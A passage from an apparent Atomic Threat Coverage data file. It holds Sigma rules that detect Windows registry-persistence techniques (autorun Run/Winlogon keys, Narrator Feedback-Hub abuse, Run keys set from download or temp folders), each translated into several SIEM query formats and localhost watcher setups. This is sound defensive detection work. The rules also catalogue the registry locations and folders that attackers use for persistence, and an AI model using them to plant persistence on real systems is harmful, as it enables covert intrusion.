of autostart extensibility point (ASEP) in registry\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnceEx* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServices* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServicesOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Userinit* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Shell* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Windows* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Explorer\\\\\\\\\\\\\\\\User\\\\\\\\ Shell\\\\\\\\ Folders*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnceEx* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServices* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServicesOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Userinit* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Shell* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Windows* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Explorer\\\\\\\\\\\\\\\\User\\\\\\\\ Shell\\\\\\\\ Folders*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Autorun keys modification\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User Shell Folders*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows*\" OR TargetObject=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User Shell Folders*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User Shell Folders*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce.*|.*.*\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit.*|.*.*\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell.*|.*.*\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Narrator's Feedback-Hub Persistence\nid: f663a6d9-9d1b-49b8-b2b1-0637914d199a\ndescription: Detects abusing Windows 10 Narrator's Feedback-Hub\nreferences:\n    - https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html\ntags:\n    - attack.persistence\n    - attack.t1060\nauthor: Dmitriy Lifanov, oscd.community\nstatus: experimental\ndate: 2019/10/25\nmodified: 2019/11/10\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    condition: 1 of them\n    selection1:\n        EventID: 12\n        EventType: DeleteValue\n        TargetObject|endswith: '\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\DelegateExecute'\n    selection2:\n        EventID: 13\n        TargetObject|endswith: '\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\(Default)'\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Narrator's Feedback-Hub Persistence\nid: f663a6d9-9d1b-49b8-b2b1-0637914d199a\ndescription: Detects abusing Windows 10 Narrator's Feedback-Hub\nreferences:\n    - https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html\ntags:\n    - attack.persistence\n    - attack.t1060\nauthor: Dmitriy Lifanov, oscd.community\nstatus: experimental\ndate: 2019/10/25\nmodified: 2019/11/10\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    condition: 1 of them\n    selection1:\n        EventID: 12\n        EventType: DeleteValue\n        TargetObject|endswith: '\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\DelegateExecute'\n    selection2:\n        EventID: 13\n        TargetObject|endswith: '\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\(Default)'\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"12\" AND EventType:\"DeleteValue\" AND TargetObject.keyword:*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\DelegateExecute) OR (EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\\\\\(Default\\\\)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Narrator\\'s-Feedback-Hub-Persistence <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Narrator\\'s Feedback-Hub Persistence\",\\n    \"description\": \"Detects abusing Windows 10 Narrator\\'s Feedback-Hub\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"12\\\\\" AND EventType:\\\\\"DeleteValue\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\\\\\\\\\Shell\\\\\\\\\\\\\\\\open\\\\\\\\\\\\\\\\command\\\\\\\\\\\\\\\\DelegateExecute) OR (EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\\\\\\\\\Shell\\\\\\\\\\\\\\\\open\\\\\\\\\\\\\\\\command\\\\\\\\\\\\\\\\\\\\\\\\(Default\\\\\\\\)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"12\\\\\" AND EventType:\\\\\"DeleteValue\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\\\\\\\\\Shell\\\\\\\\\\\\\\\\open\\\\\\\\\\\\\\\\command\\\\\\\\\\\\\\\\DelegateExecute) OR (EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\\\\\\\\\Shell\\\\\\\\\\\\\\\\open\\\\\\\\\\\\\\\\command\\\\\\\\\\\\\\\\\\\\\\\\(Default\\\\\\\\)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Narrator\\'s Feedback-Hub Persistence\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"12\" AND EventType:\"DeleteValue\" AND TargetObject.keyword:*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\DelegateExecute) OR (EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\\\\\(Default\\\\)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"12\" EventType=\"DeleteValue\" TargetObject=\"*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\DelegateExecute\") OR (EventID=\"13\" TargetObject=\"*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\(Default)\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"12\" EventType=\"DeleteValue\" TargetObject=\"*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\DelegateExecute\") OR (event_id=\"13\" TargetObject=\"*\\\\\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\\\\\Shell\\\\\\\\open\\\\\\\\command\\\\\\\\(Default)\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*12)(?=.*DeleteValue)(?=.*.*\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\Shell\\\\open\\\\command\\\\DelegateExecute))|.*(?:.*(?=.*13)(?=.*.*\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\Shell\\\\open\\\\command\\\\\\\\(Default\\\\)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious RUN Key from Download\nid: 9c5037d1-c568-49b3-88c7-9846a5bdc2be\nstatus: experimental\ndescription: Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories\nreferences:\n    - https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/\nauthor: Florian Roth\ndate: 2019/10/01\ntags:\n    - attack.persistence\n    - attack.t1060\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        Image: \n            - '*\\Downloads\\\\*'\n            - '*\\Temporary Internet Files\\Content.Outlook\\\\*'\n            - '*\\Local Settings\\Temporary Internet Files\\\\*'\n        TargetObject: '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*'\n    condition: selection\nfalsepositives:\n    - Software installers downloaded and used by users\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious RUN Key from Download\nid: 9c5037d1-c568-49b3-88c7-9846a5bdc2be\nstatus: experimental\ndescription: Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories\nreferences:\n    - https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/\nauthor: Florian Roth\ndate: 2019/10/01\ntags:\n    - attack.persistence\n    - attack.t1060\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        Image: \n            - '*\\Downloads\\\\*'\n            - '*\\Temporary Internet Files\\Content.Outlook\\\\*'\n            - '*\\Local Settings\\Temporary Internet Files\\\\*'\n        TargetObject: '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*'\n    condition: selection\nfalsepositives:\n    - Software installers downloaded and used by users\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND Image.keyword:(*\\\\\\\\Downloads\\\\\\\\* OR *\\\\\\\\Temporary\\\\ Internet\\\\ Files\\\\\\\\Content.Outlook\\\\\\\\* OR *\\\\\\\\Local\\\\ Settings\\\\\\\\Temporary\\\\ Internet\\\\ Files\\\\\\\\*) AND TargetObject.keyword:*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-RUN-Key-from-Download <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious RUN Key from Download\",\\n    \"description\": \"Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\Downloads\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Temporary\\\\\\\\ Internet\\\\\\\\ Files\\\\\\\\\\\\\\\\Content.Outlook\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Local\\\\\\\\ Settings\\\\\\\\\\\\\\\\Temporary\\\\\\\\ Internet\\\\\\\\ Files\\\\\\\\\\\\\\\\*) AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\Downloads\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Temporary\\\\\\\\ Internet\\\\\\\\ Files\\\\\\\\\\\\\\\\Content.Outlook\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Local\\\\\\\\ Settings\\\\\\\\\\\\\\\\Temporary\\\\\\\\ Internet\\\\\\\\ Files\\\\\\\\\\\\\\\\*) AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious RUN Key from Download\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND Image.keyword:(*\\\\\\\\Downloads\\\\\\\\* *\\\\\\\\Temporary Internet Files\\\\\\\\Content.Outlook\\\\\\\\* *\\\\\\\\Local Settings\\\\\\\\Temporary Internet Files\\\\\\\\*) AND TargetObject.keyword:*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (Image=\"*\\\\\\\\Downloads\\\\\\\\*\" OR Image=\"*\\\\\\\\Temporary Internet Files\\\\\\\\Content.Outlook\\\\\\\\*\" OR Image=\"*\\\\\\\\Local Settings\\\\\\\\Temporary Internet Files\\\\\\\\*\") TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" Image IN [\"*\\\\\\\\Downloads\\\\\\\\*\", \"*\\\\\\\\Temporary Internet Files\\\\\\\\Content.Outlook\\\\\\\\*\", \"*\\\\\\\\Local Settings\\\\\\\\Temporary Internet Files\\\\\\\\*\"] TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\Downloads\\\\\\\\.*|.*.*\\\\Temporary Internet Files\\\\Content\\\\.Outlook\\\\\\\\.*|.*.*\\\\Local Settings\\\\Temporary Internet Files\\\\\\\\.*))(?=.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Registry Persistence via Explorer Run Key\nid: b7916c2a-fa2f-4795-9477-32b731f70f11\nstatus: experimental\ndescription: Detects a possible persistence mechanism using RUN key for Windows Explorer and poiting to a suspicious folder\nauthor: Florian Roth\ndate: 2018/07/18\nreferences:\n    - https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: '*\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run'\n        Details: \n            - 'C:\\Windows\\Temp\\\\*'\n            - 'C:\\ProgramData\\\\*'\n            - '*\\AppData\\\\*'\n            - 'C:\\$Recycle.bin\\\\*'\n            - 'C:\\Temp\\\\*'\n            - 'C:\\Users\\Public\\\\*'\n            - 'C:\\Users\\Default\\\\*'\n    condition: selection\ntags:\n    - attack.persistence\n    - attack.t1060\n    - capec.270\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Registry Persistence via Explorer Run Key\nid: b7916c2a-fa2f-4795-9477-32b731f70f11\nstatus: experimental\ndescription: Detects a possible persistence mechanism using RUN key for Windows Explorer and poiting to a suspicious folder\nauthor: Florian Roth\ndate: 2018/07/18\nreferences:\n    - https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: '*\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run'\n        Details: \n            - 'C:\\Windows\\Temp\\\\*'\n            - 'C:\\ProgramData\\\\*'\n            - '*\\AppData\\\\*'\n            - 'C:\\$Recycle.bin\\\\*'\n            - 'C:\\Temp\\\\*'\n            - 'C:\\Users\\Public\\\\*'\n            - 'C:\\Users\\Default\\\\*'\n    condition: selection\ntags:\n    - attack.persistence\n    - attack.t1060\n    - capec.270\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run AND Details.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\* OR C\\\\:\\\\\\\\ProgramData\\\\\\\\* OR *\\\\\\\\AppData\\\\\\\\* OR C\\\\:\\\\\\\\$Recycle.bin\\\\\\\\* OR C\\\\:\\\\\\\\Temp\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Registry-Persistence-via-Explorer-Run-Key <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Registry Persistence via Explorer Run Key\",\\n    \"description\": \"Detects a possible persistence mechanism using RUN key for Windows Explorer and poiting to a suspicious folder\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\",\\n      \"capec.270\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND 